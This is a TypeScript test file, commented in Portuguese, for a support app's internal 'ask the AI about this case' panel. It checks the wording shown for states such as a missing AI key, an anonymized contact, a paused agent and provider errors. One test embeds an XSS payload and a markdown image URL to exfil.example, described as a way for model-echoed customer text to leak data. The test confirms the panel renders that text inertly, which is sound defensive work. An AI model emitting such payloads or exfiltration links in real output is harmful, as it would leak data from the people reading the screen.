/**
 * O PAINEL DE "CONVERSAR SOBRE O CASO" — CADA ESTADO VIRA FRASE.
 *
 * ─── Por que um arquivo só para os estados ─────────────────────────────────
 *
 * Este painel tem NOVE desfechos que não são "deu certo", e todos eles são
 * invisíveis no caminho feliz: instalação sem chave de IA, contato anonimizado,
 * agente pausado, atendimento reaberto, contato que pediu para não receber
 * mensagem, conversa de outra pessoa, teto de perguntas, falha do provedor e
 * linha apagada pela LGPD. Cada um desses é o estado NORMAL de alguma
 * instalação — o primeiro é o estado de TODA VPS recém-instalada — e nenhum
 * deles aparece quando se abre a tela com dado bom.
 *
 * Um painel que renderiza vazio, ou que oferece um campo que sempre falha, é
 * indistinguível de um painel correto para quem só olha o caminho feliz. Por
 * isso cada estado tem caso próprio aqui, afirmando a FRASE que a pessoa lê —
 * não a presença de uma div.
 *
 * ─── O que este arquivo NÃO prova ──────────────────────────────────────────
 *
 * Não prova a ordem do painel dentro do `CaseDetail` — isso é o call site, e
 * quem guarda é `tests/unit/case-detail.test.tsx`. Não prova que a rota
 * devolve o que o hook espera: os hooks aqui são mocados, e quem prova o
 * contrato do wire é `tests/unit/conversa-do-caso-rota.test.ts`.
 */
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { ApiError } from "@/lib/api/types";
import type { CaseChatData } from "@/hooks/ai/useCaseChat";

const useCaseChatMock = vi.fn();
const mutateMock = vi.fn();
const askState: { isPending: boolean; error: unknown } = { isPending: false, error: null };

vi.mock("@/hooks/ai/useCaseChat", () => ({
  useCaseChat: (...args: unknown[]) => useCaseChatMock(...args),
  useAskCase: () => ({ mutate: mutateMock, isPending: askState.isPending, error: askState.error }),
}));

import { CaseChatPanel } from "@/app/app/ai/cases/_components/CaseChatPanel";

const ESTADO_BOM: CaseChatData["estado"] = {
  caso_obsoleto: false,
  contato_bloqueado: false,
  contato_anonimizado: false,
  status: "awaiting_human",
  ia_configurada: true,
};

function dados(over: Partial<CaseChatData> = {}): CaseChatData {
  return {
    mensagens: [],
    persona: { fonte: "agente_do_caso", nome: "Ana", motivo: null },
    estado: ESTADO_BOM,
    ...over,
  };
}

/** O hook devolve `useQuery`; só três campos importam para a tela. */
function comChat(data: CaseChatData | undefined, over: Record<string, unknown> = {}) {
  useCaseChatMock.mockReturnValue({ data, isLoading: false, error: null, ...over });
}

function pintar() {
  render(<CaseChatPanel caseId="case-1" />);
}

beforeEach(() => {
  useCaseChatMock.mockReset();
  mutateMock.mockReset();
  askState.isPending = false;
  askState.error = null;
});

describe("CaseChatPanel — os rótulos que NÃO podem colidir com os e2e obrigatórios", () => {
  /**
   * `escalacao-ciclo.spec.ts` e `encerramento-atendimento.spec.ts` acham o
   * painel de decisão por `getByRole("button", { name: "Enviar", exact: true })`
   * e pelo placeholder "Escreva sua resposta para a IA...". Um segundo botão
   * "Enviar" na mesma tela é *strict mode violation* — os dois e2e ficam
   * vermelhos, e o sintoma não aponta para cá.
   *
   * Este caso é a versão barata daquela prova: roda em 40ms, sem browser, e
   * reprova no minuto em que alguém "melhorar" o rótulo.
   */
  it("o botão chama Perguntar (nunca Enviar) e o campo tem placeholder próprio", () => {
    comChat(dados());
    pintar();

    expect(screen.getByRole("button", { name: "Perguntar" })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Enviar" })).not.toBeInTheDocument();
    expect(screen.getByPlaceholderText("Pergunte à IA sobre este caso…")).toBeInTheDocument();
    expect(
      screen.queryByPlaceholderText("Escreva sua resposta para a IA..."),
    ).not.toBeInTheDocument();
  });
});

describe("CaseChatPanel — o que a tela promete sobre si mesma", () => {
  it("diz, de forma permanente, que a conversa é interna e que a IA não age", () => {
    // É o antídoto do modo de falha "a IA já avisou o cliente". Sem esta frase,
    // um atendente que leu "vou verificar com o financeiro" na bolha da IA pode
    // concluir que o cliente recebeu isso.
    comChat(dados());
    pintar();
    expect(
      screen.getByText(
        "Conversa interna. O cliente não vê nada disto, e a IA aqui não envia mensagem nem muda o caso.",
      ),
    ).toBeInTheDocument();
  });

  it("diz que a pergunta do colega demora alguns segundos para aparecer", () => {
    // A thread atualiza por consulta periódica (15s), não por push. Sem a frase,
    // dois atendentes no mesmo caso acham que o outro não perguntou nada.
    comChat(dados());
    pintar();
    expect(
      screen.getByText("As perguntas dos colegas aparecem aqui em alguns segundos."),
    ).toBeInTheDocument();
  });
});

describe("CaseChatPanel — vazio", () => {
  it("convida a perguntar antes de decidir e oferece três perguntas prontas", () => {
    comChat(dados({ mensagens: [] }));
    pintar();

    expect(screen.getByText("Pergunte antes de decidir.")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Por que a IA não resolveu sozinha?" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "O que o cliente já tentou?" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "O que muda se eu concluir agora?" })).toBeInTheDocument();
  });

  it("a sugestão PREENCHE o campo e não gasta uma chamada paga", async () => {
    // Clique acidental numa sugestão que enviasse sozinha custaria dinheiro da
    // chave do self-hoster. Preencher deixa a pessoa revisar antes.
    comChat(dados({ mensagens: [] }));
    pintar();

    await userEvent.click(screen.getByRole("button", { name: "O que o cliente já tentou?" }));

    expect(screen.getByPlaceholderText("Pergunte à IA sobre este caso…")).toHaveValue(
      "O que o cliente já tentou?",
    );
    expect(mutateMock).not.toHaveBeenCalled();
  });
});

describe("CaseChatPanel — instalação fresca, sem chave de IA", () => {
  /**
   * `ia_configurada === false` é o estado de TODA VPS recém-instalada. Um campo
   * que sempre termina em bolha vermelha é pior que campo nenhum: gasta o
   * clique e não diz onde configurar.
   */
  it("some com o campo e com as sugestões, e diz onde configurar", () => {
    comChat(dados({ estado: { ...ESTADO_BOM, ia_configurada: false } }));
    pintar();

    expect(screen.queryByPlaceholderText("Pergunte à IA sobre este caso…")).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Perguntar" })).not.toBeInTheDocument();
    expect(
      screen.queryByRole("button", { name: "Por que a IA não resolveu sozinha?" }),
    ).not.toBeInTheDocument();

    expect(
      screen.getByText(
        "Nenhum provedor de IA está configurado. Peça a quem administra para configurar em IA › Provedores.",
      ),
    ).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Abrir IA › Provedores" })).toHaveAttribute(
      "href",
      "/app/ai/providers",
    );
  });
});

describe("CaseChatPanel — recusas e avisos sobre o contato", () => {
  it("contato anonimizado: o campo some e a frase explica que a recusa é a pedido dele", () => {
    comChat(dados({ estado: { ...ESTADO_BOM, contato_anonimizado: true } }));
    pintar();

    expect(screen.queryByPlaceholderText("Pergunte à IA sobre este caso…")).not.toBeInTheDocument();
    expect(
      screen.getByText(
        "Este contato foi anonimizado a pedido dele. A IA não responde sobre casos de contato anonimizado.",
      ),
    ).toBeInTheDocument();
  });

  it("contato bloqueado: dá para entender o caso, mas a tela avisa que nada sai para ele", () => {
    comChat(dados({ estado: { ...ESTADO_BOM, contato_bloqueado: true } }));
    pintar();

    expect(
      screen.getByText(
        "Este contato pediu para não receber mensagens. Dá para entender o caso aqui, mas nada pode ser enviado a ele.",
      ),
    ).toBeInTheDocument();
    // Bloqueado NÃO é recusa: perguntar continua valendo.
    expect(screen.getByRole("button", { name: "Perguntar" })).toBeInTheDocument();
  });
});

describe("CaseChatPanel — quem está respondendo", () => {
  it("agente pausado: a faixa diz que quem responde é o assistente padrão, e por quê", () => {
    // Sem esta faixa, a promessa da feature ("pergunte à IA que ABRIU o caso")
    // é quebrada em silêncio: outra voz responde e ninguém sabe.
    comChat(dados({ persona: { fonte: "padrao_da_organizacao", nome: null, motivo: "pausado" } }));
    pintar();

    expect(screen.getByText(/A IA que abriu este caso não está mais no ar/)).toBeInTheDocument();
    expect(screen.getByText(/o agente está pausado/)).toBeInTheDocument();
    expect(
      screen.getByText(
        /Quem responde aqui é o assistente padrão da organização — ele não tem as instruções daquele agente\./,
      ),
    ).toBeInTheDocument();
  });

  it("agente no ar: nenhuma faixa de substituição aparece", () => {
    comChat(dados());
    pintar();
    expect(screen.queryByText(/A IA que abriu este caso não está mais no ar/)).not.toBeInTheDocument();
  });
});

describe("CaseChatPanel — o atendimento mudou debaixo do caso", () => {
  it("obsoleto: a faixa diz que a conversa abaixo pode não ser a que gerou o caso", () => {
    comChat(dados({ estado: { ...ESTADO_BOM, caso_obsoleto: true } }));
    pintar();
    expect(
      screen.getByText(
        "O atendimento que originou este caso já foi encerrado e reaberto. A conversa abaixo pode não ser a que gerou o caso.",
      ),
    ).toBeInTheDocument();
  });

  it("desconhecido (null): a tela admite que não deu para conferir, em vez de afirmar que está tudo bem", () => {
    // Falhar FECHADO na ação, ABERTO na informação: o GET degrada para `null`
    // quando o banco não responde. Tratar `null` como `false` faria a tela
    // afirmar o que ninguém mediu.
    comChat(dados({ estado: { ...ESTADO_BOM, caso_obsoleto: null } }));
    pintar();
    expect(screen.getByText("Não deu para conferir se o atendimento mudou.")).toBeInTheDocument();
  });
});

describe("CaseChatPanel — conversa de outra pessoa", () => {
  it("404 do chat com o caso na tela vira a frase de quem pedir acompanhamento", () => {
    // A rota funde três recusas num 404 de propósito (403 confirmaria a
    // existência). Aqui o caso JÁ está na tela, então o 404 do chat significa
    // "a conversa é de outra pessoa" — e a frase diz o que fazer.
    comChat(undefined, {
      error: new ApiError(404, "not_found", undefined, "req-1", "Caso não encontrado."),
    });
    pintar();

    expect(
      screen.getByText(
        "Este atendimento é de outra pessoa. Peça para ela, ou para quem administra, se precisar acompanhar.",
      ),
    ).toBeInTheDocument();
    expect(screen.queryByPlaceholderText("Pergunte à IA sobre este caso…")).not.toBeInTheDocument();
  });
});

describe("CaseChatPanel — a thread", () => {
  const TURNO: CaseChatData["mensagens"] = [
    {
      id: "m-1",
      turn_id: "t-1",
      author_kind: "human",
      author_user_id: "u-1",
      body: "Por que a IA não resolveu sozinha?",
      error_code: null,
      agent_id: null,
      service_stale: false,
      redacted_at: null,
      created_at: "2026-07-20T10:00:00.000Z",
    },
    {
      id: "m-2",
      turn_id: "t-1",
      author_kind: "ai",
      author_user_id: null,
      body: "O desconto pedido passa do limite da política.",
      error_code: null,
      agent_id: "a-1",
      service_stale: false,
      redacted_at: null,
      created_at: "2026-07-20T10:00:20.000Z",
    },
  ];

  it("mostra pergunta e resposta com autor, e o leitor de tela recebe a chegada", () => {
    comChat(dados({ mensagens: TURNO }));
    pintar();

    const thread = screen.getByRole("log");
    expect(thread).toHaveAttribute("aria-live", "polite");
    expect(within(thread).getByText("Pergunta da equipe")).toBeInTheDocument();
    expect(within(thread).getByText("Por que a IA não resolveu sozinha?")).toBeInTheDocument();
    // O nome da persona identifica QUEM respondeu — a promessa da feature.
    expect(within(thread).getByText("Ana")).toBeInTheDocument();
    expect(
      within(thread).getByText("O desconto pedido passa do limite da política."),
    ).toBeInTheDocument();
  });

  it("o corpo da mensagem é TEXTO, nunca marcação interpretada", () => {
    /**
     * O corpo carrega texto que o CLIENTE escreveu, repetido pelo modelo. Não
     * há renderizador de markdown no projeto nem CSP global: interpretar
     * `![](https://x/?q=…)` faria o navegador de quem atende buscar aquela URL
     * — exfiltração pela própria tela de quem está decidindo o caso.
     */
    const veneno = '<img src=x onerror="alert(1)"> ![](https://exfil.example/?q=segredo)';
    comChat(
      dados({
        mensagens: [{ ...TURNO[1]!, id: "m-3", body: veneno }],
      }),
    );
    pintar();

    const thread = screen.getByRole("log");
    expect(thread.textContent).toContain(veneno);
    expect(thread.querySelector("img")).toBeNull();
  });

  it("linha da IA que falhou mostra a FRASE do motivo, nunca o código cru", () => {
    // A linha fica gravada quando o modelo não responde (é o rastro que a rota
    // promete). Mostrar `llm_not_configured` a quem ia decidir o caso não é
    // informação: é um enum.
    comChat(
      dados({
        mensagens: [{ ...TURNO[1]!, id: "m-4", body: null, error_code: "llm_not_configured" }],
      }),
    );
    pintar();

    expect(
      screen.getByText(
        "Nenhum provedor de IA está configurado. Peça a quem administra para configurar em IA › Provedores.",
      ),
    ).toBeInTheDocument();
    expect(screen.queryByText("llm_not_configured")).not.toBeInTheDocument();
  });

  it("linha apagada pela LGPD diz que foi apagada, em vez de sumir sem explicação", () => {
    // A cascata zera `body` e carimba `redacted_at`. Uma bolha vazia faria
    // parecer defeito; a frase diz que foi a pedido do contato.
    comChat(
      dados({
        mensagens: [
          { ...TURNO[0]!, id: "m-5", body: null, redacted_at: "2026-07-21T10:00:00.000Z" },
        ],
      }),
    );
    pintar();
    expect(screen.getByText("Mensagem apagada a pedido do contato.")).toBeInTheDocument();
  });
});

describe("CaseChatPanel — pensando", () => {
  it("anuncia a espera, desabilita o botão e não deixa perguntar de novo", () => {
    askState.isPending = true;
    comChat(dados());
    pintar();

    expect(screen.getByText("A IA está lendo o caso…")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Perguntando…" })).toBeDisabled();
  });
});

describe("CaseChatPanel — falhas da pergunta", () => {
  it("erro do provedor: a frase da rota fica visível e o código do pedido vira anexo copiável", () => {
    askState.error = new ApiError(
      422,
      "orcamento_esgotado",
      undefined,
      "req-42",
      "A IA parou porque o gasto do mês atingiu o limite definido. Ajuste em Uso de IA › Orçamento.",
    );
    comChat(dados());
    pintar();

    expect(
      screen.getByText(
        "A IA parou porque o gasto do mês atingiu o limite definido. Ajuste em Uso de IA › Orçamento.",
      ),
    ).toBeInTheDocument();
    // O id é ANEXO, não a mensagem: quem lê não sabe o que é um uuid.
    expect(screen.getByText("req-42").tagName).toBe("CODE");
  });

  it("429: a frase fala com quem perguntou, não com quem opera o servidor", () => {
    askState.error = new ApiError(
      429,
      "rate_limited",
      undefined,
      "req-9",
      "Muitas perguntas seguidas. Tente em um minuto.",
    );
    comChat(dados());
    pintar();

    expect(
      screen.getByText("Você fez muitas perguntas seguidas. Tente de novo em um minuto."),
    ).toBeInTheDocument();
  });

  it("falha sem ApiError (rede caiu) não deixa a tela muda", () => {
    askState.error = new Error("Failed to fetch");
    comChat(dados());
    pintar();

    expect(
      screen.getByText(
        "Não deu para responder agora. Tente de novo; se continuar, mande este código para quem instalou o sistema.",
      ),
    ).toBeInTheDocument();
  });
});

describe("CaseChatPanel — mandar a pergunta", () => {
  it("Ctrl+Enter envia; Enter sozinho quebra linha", async () => {
    // A pergunta costuma ter duas frases. `Enter` que envia transformaria a
    // segunda frase numa segunda chamada paga.
    comChat(dados());
    pintar();

    const campo = screen.getByPlaceholderText("Pergunte à IA sobre este caso…");
    await userEvent.click(campo);
    await userEvent.keyboard("Por que travou?");
    await userEvent.keyboard("{Enter}");
    expect(mutateMock).not.toHaveBeenCalled();

    await userEvent.keyboard("{Control>}{Enter}{/Control}");
    expect(mutateMock).toHaveBeenCalledTimes(1);
    expect(mutateMock.mock.calls[0]?.[0]).toMatchObject({
      id: "case-1",
      pergunta: expect.stringContaining("Por que travou?"),
    });
  });

  it("o botão fica desabilitado enquanto a pergunta é curta demais para valer uma chamada", async () => {
    // A rota exige 3 caracteres. Deixar o botão vivo produziria um 422 que a
    // pessoa não tem como entender.
    comChat(dados());
    pintar();

    expect(screen.getByRole("button", { name: "Perguntar" })).toBeDisabled();
    await userEvent.type(screen.getByPlaceholderText("Pergunte à IA sobre este caso…"), "oi?");
    expect(screen.getByRole("button", { name: "Perguntar" })).toBeEnabled();
  });
});
